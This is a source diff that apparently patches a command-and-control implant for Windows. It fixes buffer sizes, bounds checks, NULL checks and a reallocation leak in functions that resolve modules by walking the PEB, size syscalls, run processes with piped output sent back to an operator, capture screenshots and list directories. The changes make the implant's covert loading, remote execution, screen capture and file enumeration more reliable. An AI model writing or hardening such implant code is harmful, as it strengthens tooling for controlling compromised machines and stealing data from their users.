@@ -111,7 +111,7 @@ PVOID LdrModulePebByString(
         Instance->Teb = NtCurrentTeb();
     }
 
-    Name = MmHeapAlloc( MAX_PATH );
+    Name = MmHeapAlloc( MAX_PATH * sizeof( WCHAR ) );
 
     Peb = Instance->Teb->ProcessEnvironmentBlock;
     Hdr = & Peb->Ldr->InLoadOrderModuleList;
@@ -120,13 +120,18 @@ PVOID LdrModulePebByString(
     for ( ; Hdr != Ent ; Ent = Ent->Flink ) {
         Ldr = C_PTR( Ent );
 
-        if ( Ldr->BaseDllName.Length <= 260 ) {
+        /* BaseDllName.Length is a byte count: only handle names that fit
+         * into the buffer with room for the NUL terminator */
+        if ( Ldr->BaseDllName.Length && Ldr->BaseDllName.Length < MAX_PATH * sizeof( WCHAR ) ) {
+
+            ULONG Chars = Ldr->BaseDllName.Length / sizeof( WCHAR );
 
             MemCopy( Name, Ldr->BaseDllName.Buffer, Ldr->BaseDllName.Length );
+            Name[ Chars ] = L'\0';
 
             /* turn the module name from PEB to upper */
             do {
-                if ( Idx < Ldr->BaseDllName.Length ) {
+                if ( Idx < Chars ) {
                     if ( Name[ Idx ] >= 'a' ) {
                         Name[ Idx ] -= 0x20;
                     }
@@ -143,12 +148,12 @@ PVOID LdrModulePebByString(
                 return Ldr->DllBase;
             }
 
-            MemZero( Name, MAX_PATH );
+            MemZero( Name, MAX_PATH * sizeof( WCHAR ) );
         }
     }
 
     if ( Name ) {
-        MemZero( Name, MAX_PATH );
+        MemZero( Name, MAX_PATH * sizeof( WCHAR ) );
         MmHeapFree( Name );
         Name = NULL;
     }
@@ -178,6 +183,12 @@ PVOID LdrModuleSearch(
 
     Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
     FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+
+    /* Name[260] must also fit an appended ".dll" and the NUL: reject
+     * anything that can't */
+    if ( ! ModuleName || StringLengthW( ModuleName ) >= 260 - 4 ) {
+        return NULL;
+    }
 
     StringCopyW( Name, ModuleName );
 
@@ -226,6 +237,12 @@ PVOID LdrModuleLoad(
     NTSTATUS       NtStatus       = STATUS_SUCCESS;
 
     if ( ! ModuleName ) {
+        return NULL;
+    }
+
+    /* NameW[260] is a fixed buffer: an ANSI name of 260+ chars would
+     * overflow the conversion below */
+    if ( StringLengthA( ModuleName ) >= 260 ) {
         return NULL;
     }
 
@@ -471,6 +488,8 @@ UINT32 GetSyscallSize(
 
     for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
     {
+        FunctionAddr = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+
         /* ignore redirect functions */
         if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
              ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
@@ -605,8 +624,18 @@ BOOL ProcessCreate(
     {
         PUTS( "Piped enabled" )
         AnonPipe = Instance->Win32.LocalAlloc( LPTR, sizeof( ANONPIPE ) );
+        if ( ! AnonPipe )
+        {
+            PUTS( "Failed to allocate anon pipe structure" )
+            return FALSE;
+        }
         MemSet( AnonPipe, 0, sizeof( ANONPIPE ) );
-        AnonPipesInit( AnonPipe );
+        if ( ! AnonPipesInit( AnonPipe ) )
+        {
+            PUTS( "Failed to initialize anon pipes" )
+            DATA_FREE( AnonPipe, sizeof( ANONPIPE ) );
+            return FALSE;
+        }
 
         StartUpInfo.hStdError  = AnonPipe->StdOutWrite;
         StartUpInfo.hStdOutput = AnonPipe->StdOutWrite;
@@ -747,9 +776,18 @@ BOOL ProcessCreate(
         {
             INT32 i  = 0;
             INT32 x  = ( INT32 ) StringLengthW( CmdLine );
-            PWCHAR s = Instance->Win32.LocalAlloc( LPTR, x * sizeof( WCHAR ) );
+            /* allocate one extra WCHAR so s[i] = 0 stays in bounds when the
+             * command line contains no space */
+            PWCHAR s = Instance->Win32.LocalAlloc( LPTR, ( x + 1 ) * sizeof( WCHAR ) );
+            if ( ! s )
+            {
+                PRINTF( "LocalAlloc: Failed [%d]\n", NtGetLastError() );
+                PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_NOT_ENOUGH_MEMORY );
+                Return = FALSE;
+                goto Cleanup;
+            }
 
-            MemCopy( s, CmdLine, x );
+            MemCopy( s, CmdLine, x * sizeof( WCHAR ) );
 
             // remove the arguments. we are just interested in the process name/path
             for ( ; i < x; i++ ) {
@@ -763,7 +801,7 @@ BOOL ProcessCreate(
             PackageAddInt32( Package, ProcessInfo->dwProcessId );
             PackageTransmit( Package );
 
-            DATA_FREE( s, x );
+            DATA_FREE( s, ( x + 1 ) * sizeof( WCHAR ) );
         }
     }
 
@@ -1028,7 +1066,16 @@ VOID AnonPipesRead(
 
         dwBufferSize += dwRead;
 
-        Buffer = Instance->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
+        LPVOID ReAlloced = Instance->Win32.LocalReAlloc( Buffer, dwBufferSize, LMEM_MOVEABLE );
+
+        if ( ! ReAlloced ) {
+            /* allocation failed: keep the old buffer and send what we have so
+             * far instead of losing the pointer (leak) and sending from NULL */
+            dwBufferSize -= dwRead;
+            break;
+        }
+
+        Buffer = ReAlloced;
 
         MemCopy( Buffer + ( dwBufferSize - dwRead ), buf, dwRead );
         MemSet( buf, 0, dwRead );
@@ -1109,6 +1156,10 @@ BOOL WinScreenshot(
 
     BitMapSize  = cbBits + ( sizeof( BITMAPFILEHEADER ) + sizeof( BITMAPINFOHEADER ) );
     BitMapImage = Instance->Win32.LocalAlloc( LPTR, BitMapSize );
+    if ( ! BitMapImage ) {
+        PUTS( "Failed to allocate bitmap buffer" )
+        goto Cleanup;
+    }
 
     hMemDC  = Instance->Win32.CreateCompatibleDC( hDC );
     if ( ! hMemDC ) {
@@ -1522,8 +1573,14 @@ PROOT_DIR listDir(
         goto Cleanup;
     }
 
-    // copy the path
+    // copy the path. an empty path would make the PathSize - 1 accesses
+    // below read out of bounds, so reject it up front.
     PathSize = MIN( MAX_PATH, StringLengthW( StartPath ) );
+    if ( PathSize == 0 )
+    {
+        PUTS( "Empty path" );
+        goto Cleanup;
+    }
     MemCopy( Path, StartPath, PathSize * sizeof( WCHAR ) );
 
     // search for the first file in the folder specified
